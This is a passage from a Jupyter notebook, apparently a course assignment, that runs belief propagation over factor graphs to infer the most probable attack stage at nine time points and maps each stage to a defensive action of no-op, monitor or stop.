   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E7: 100%|██████████| 1/1 [00:00<00:00, 132.75it/s]\n"
     ]
    }
   ],
   "source": [
    "G_7 = FactorGraph()\n",
    "\n",
    "G_7.add_nodes_from(['E7','S7'])\n",
    "G_7.add_factors(f_7)\n",
    "G_7.add_edges_from([('E7',f_7),('S7',f_7)])\n",
    "\n",
    "bp = BeliefPropagation(G_7)\n",
    "margin['S7'] = list(bp.query(variables = ['S7']).values)\n",
    "state_index['S7'] = margin['S7'].index(max(margin['S7']))+1\n",
    "# print(margin['S7'],'\\n',state_index['S7'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 1347,
     "status": "ok",
     "timestamp": 1588207469303,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "upW48UB50pVq",
    "outputId": "c9ecad46-1187-447b-b17b-b459a3a20c05"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E8: 100%|██████████| 1/1 [00:00<00:00, 449.02it/s]\n"
     ]
    }
   ],
   "source": [
    "G_8 = FactorGraph()\n",
    "\n",
    "G_8.add_nodes_from(['E8','S8'])\n",
    "G_8.add_factors(f_8)\n",
    "G_8.add_edges_from([('E8',f_8),('S8',f_8)])\n",
    "\n",
    "bp = BeliefPropagation(G_8)\n",
    "margin['S8'] = list(bp.query(variables = ['S8']).values)\n",
    "state_index['S8'] = margin['S8'].index(max(margin['S8']))+1\n",
    "# print(margin['S8'],'\\n',state_index['S8'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 34
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 1453,
     "status": "ok",
     "timestamp": 1588207469426,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "-J-6ZZcr0pVt",
    "outputId": "75a65b43-8641-4c77-c46b-d274681c4336"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Eliminating: E9: 100%|██████████| 1/1 [00:00<00:00, 368.44it/s]\n"
     ]
    }
   ],
   "source": [
    "G_9 = FactorGraph()\n",
    "\n",
    "G_9.add_nodes_from(['E9','S9'])\n",
    "G_9.add_factors(f_9)\n",
    "G_9.add_edges_from([('E9',f_9),('S9',f_9)])\n",
    "\n",
    "bp = BeliefPropagation(G_9)\n",
    "margin['S9'] = list(bp.query(variables = ['S9']).values)\n",
    "state_index['S9'] = margin['S9'].index(max(margin['S9']))+1\n",
    "# print(margin['S9'],'\\n',state_index['S9'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "dJCpyfnc0pVz"
   },
   "source": [
    "#### At every time point,  the marginal probability of each state"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 317
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 393,
     "status": "ok",
     "timestamp": 1588207539152,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "RRFdbPF3-CRX",
    "outputId": "1014241a-5c9c-45f4-f184-10e77c11b85c"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "      <th>discovery</th>\n",
       "      <th>access</th>\n",
       "      <th>lateral_movement</th>\n",
       "      <th>privilege_escalation</th>\n",
       "      <th>persistence</th>\n",
       "      <th>defense_evasion</th>\n",
       "      <th>collection</th>\n",
       "      <th>exfiltration</th>\n",
       "      <th>command_control</th>\n",
       "      <th>execution</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>S1</th>\n",
       "      <td>0.936000</td>\n",
       "      <td>0.064</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S2</th>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S3</th>\n",
       "      <td>0.553333</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.446667</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S4</th>\n",
       "      <td>0.553333</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.446667</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S5</th>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S6</th>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S7</th>\n",
       "      <td>0.020000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.98</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S8</th>\n",
       "      <td>0.020000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.98</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S9</th>\n",
       "      <td>0.020000</td>\n",
       "      <td>0.000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.98</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      benign  discovery  access  lateral_movement  privilege_escalation  \\\n",
       "S1  0.936000      0.064     0.0               0.0              0.000000   \n",
       "S2  1.000000      0.000     0.0               0.0              0.000000   \n",
       "S3  0.553333      0.000     0.0               0.0              0.446667   \n",
       "S4  0.553333      0.000     0.0               0.0              0.446667   \n",
       "S5  0.000000      0.000     0.0               0.0              1.000000   \n",
       "S6  0.000000      0.000     0.0               0.0              0.000000   \n",
       "S7  0.020000      0.000     0.0               0.0              0.000000   \n",
       "S8  0.020000      0.000     0.0               0.0              0.000000   \n",
       "S9  0.020000      0.000     0.0               0.0              0.000000   \n",
       "\n",
       "    persistence  defense_evasion  collection  exfiltration  command_control  \\\n",
       "S1          0.0              0.0         0.0          0.00              0.0   \n",
       "S2          0.0              0.0         0.0          0.00              0.0   \n",
       "S3          0.0              0.0         0.0          0.00              0.0   \n",
       "S4          0.0              0.0         0.0          0.00              0.0   \n",
       "S5          0.0              0.0         0.0          0.00              0.0   \n",
       "S6          1.0              0.0         0.0          0.00              0.0   \n",
       "S7          0.0              0.0         0.0          0.98              0.0   \n",
       "S8          0.0              0.0         0.0          0.98              0.0   \n",
       "S9          0.0              0.0         0.0          0.98              0.0   \n",
       "\n",
       "    execution  \n",
       "S1        0.0  \n",
       "S2        0.0  \n",
       "S3        0.0  \n",
       "S4        0.0  \n",
       "S5        0.0  \n",
       "S6        0.0  \n",
       "S7        0.0  \n",
       "S8        0.0  \n",
       "S9        0.0  "
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "asm_key_list = list(ATTACK_STATES_MAP.keys()) \n",
    "asm_val_list = list(ATTACK_STATES_MAP.values()) \n",
    "\n",
    "df_margin = pd.DataFrame()\n",
    "for key in sorted(margin.keys()):\n",
    "  df_margin[key] = margin[key]\n",
    "df_margin = df_margin.T\n",
    "df_margin.columns = asm_key_list\n",
    "df_margin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "qMA-ha6X0pV0"
   },
   "source": [
    "#### At every time point,  the most probable state"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 194
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 455,
     "status": "ok",
     "timestamp": 1588207539581,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "O0QUlUSV0pVv",
    "outputId": "d10faf82-fd6a-425b-81b7-67e3e9e87870"
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "S1                  benign\n",
       "S2                  benign\n",
       "S3                  benign\n",
       "S4                  benign\n",
       "S5    privilege_escalation\n",
       "S6             persistence\n",
       "S7            exfiltration\n",
       "S8            exfiltration\n",
       "S9            exfiltration\n",
       "Name: Probable State, dtype: object"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_margin['Probable State'] = df_margin.idxmax(axis=1).values\n",
    "df_margin['Probable State']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "colab": {},
    "colab_type": "code",
    "id": "pAw4TKnl0pV0"
   },
   "outputs": [],
   "source": [
    "ACTIONS = {\n",
    "    # each value in an actions' vector corresponds to an attack stage\n",
    "    'NO-OP':   [1.,   0.61, 0.69, 0.09, 0.2 , 0. ,  0.,   0.,   0. ,  0. ,  0.],\n",
    "    'MONITOR': [0.  , 0.39, 0.31 ,0.84, 0.63, 0.7,  0.07 ,0.1 , 0. ,  0. ,  0.],\n",
    "    'STOP':    [0.  , 0.,   0.  , 0.07, 0.17, 0.3,  0.93 ,0.9 , 1. ,  1. ,  1.]\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 407
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 325,
     "status": "ok",
     "timestamp": 1588207540009,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "eBjjBRBR-iED",
    "outputId": "a86a2b45-0fd5-41ee-d6f6-3a3ffa146d65"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>NO-OP</th>\n",
       "      <th>MONITOR</th>\n",
       "      <th>STOP</th>\n",
       "      <th>Probable Action</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>State</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>benign</th>\n",
       "      <td>1.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>NO-OP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>discovery</th>\n",
       "      <td>0.61</td>\n",
       "      <td>0.39</td>\n",
       "      <td>0.00</td>\n",
       "      <td>NO-OP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>access</th>\n",
       "      <td>0.69</td>\n",
       "      <td>0.31</td>\n",
       "      <td>0.00</td>\n",
       "      <td>NO-OP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>lateral_movement</th>\n",
       "      <td>0.09</td>\n",
       "      <td>0.84</td>\n",
       "      <td>0.07</td>\n",
       "      <td>MONITOR</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>privilege_escalation</th>\n",
       "      <td>0.20</td>\n",
       "      <td>0.63</td>\n",
       "      <td>0.17</td>\n",
       "      <td>MONITOR</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>persistence</th>\n",
       "      <td>0.00</td>\n",
       "      <td>0.70</td>\n",
       "      <td>0.30</td>\n",
       "      <td>MONITOR</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>defense_evasion</th>\n",
       "      <td>0.00</td>\n",
       "      <td>0.07</td>\n",
       "      <td>0.93</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>collection</th>\n",
       "      <td>0.00</td>\n",
       "      <td>0.10</td>\n",
       "      <td>0.90</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>exfiltration</th>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>1.00</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>command_control</th>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>1.00</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>execution</th>\n",
       "      <td>0.00</td>\n",
       "      <td>0.00</td>\n",
       "      <td>1.00</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                      NO-OP  MONITOR  STOP Probable Action\n",
       "State                                                     \n",
       "benign                 1.00     0.00  0.00           NO-OP\n",
       "discovery              0.61     0.39  0.00           NO-OP\n",
       "access                 0.69     0.31  0.00           NO-OP\n",
       "lateral_movement       0.09     0.84  0.07         MONITOR\n",
       "privilege_escalation   0.20     0.63  0.17         MONITOR\n",
       "persistence            0.00     0.70  0.30         MONITOR\n",
       "defense_evasion        0.00     0.07  0.93            STOP\n",
       "collection             0.00     0.10  0.90            STOP\n",
       "exfiltration           0.00     0.00  1.00            STOP\n",
       "command_control        0.00     0.00  1.00            STOP\n",
       "execution              0.00     0.00  1.00            STOP"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ACTIONS['State'] = asm_key_list\n",
    "action_state_df = pd.DataFrame(ACTIONS)\n",
    "action_state_df.set_index('State', inplace=True)\n",
    "action_state_df['Probable Action'] = action_state_df.idxmax(axis=1).values\n",
    "action_state_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/",
     "height": 347
    },
    "colab_type": "code",
    "executionInfo": {
     "elapsed": 378,
     "status": "ok",
     "timestamp": 1588207561895,
     "user": {
      "displayName": "Rishabh Gupta",
      "photoUrl": "",
      "userId": "18371313904054328717"
     },
     "user_tz": 300
    },
    "id": "CDQmuMuJgPEX",
    "outputId": "deffb20a-72a7-4565-8c07-0c9656b04fa6"
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Probable State</th>\n",
       "      <th>Probable Action</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Hidden State</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>S1</th>\n",
       "      <td>benign</td>\n",
       "      <td>NO-OP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S2</th>\n",
       "      <td>benign</td>\n",
       "      <td>NO-OP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S3</th>\n",
       "      <td>benign</td>\n",
       "      <td>NO-OP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S4</th>\n",
       "      <td>benign</td>\n",
       "      <td>NO-OP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S5</th>\n",
       "      <td>privilege_escalation</td>\n",
       "      <td>MONITOR</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S6</th>\n",
       "      <td>persistence</td>\n",
       "      <td>MONITOR</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S7</th>\n",
       "      <td>exfiltration</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S8</th>\n",
       "      <td>exfiltration</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>S9</th>\n",
       "      <td>exfiltration</td>\n",
       "      <td>STOP</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                    Probable State Probable Action\n",
       "Hidden State                                      \n",
       "S1                          benign           NO-OP\n",
       "S2                          benign           NO-OP\n",
       "S3                          benign           NO-OP\n",
       "S4                          benign           NO-OP\n",
       "S5            privilege_escalation         MONITOR\n",
       "S6                     persistence         MONITOR\n",
       "S7                    exfiltration            STOP\n",
       "S8                    exfiltration            STOP\n",
       "S9                    exfiltration            STOP"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_margin_action = df_margin.merge(action_state_df['Probable Action'], left_on='Probable State', right_on='State')\n",
    "df_margin_action['Hidden State'] = [key for key in sorted(margin.keys())]\n",
    "df_margin_action.set_index('Hidden State', inplace=True)\n",
    "df_margin_action[['Probable State', 'Probable Action']]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "RfYgRdbZ0pV3"
   },
   "source": [
    "### The earliest stage in which  model should recommend stopping the attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "colab_type": "text",
    "id": "Z1X7ItEvAarC"
   },
   "source": [
    "**Defense Evasion**"
   ]
  }
 ],
 "metadata": {
  "colab": {
   "collapsed_sections": [],
   "name": "mp3_am49_latest(4_24).ipynb",
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
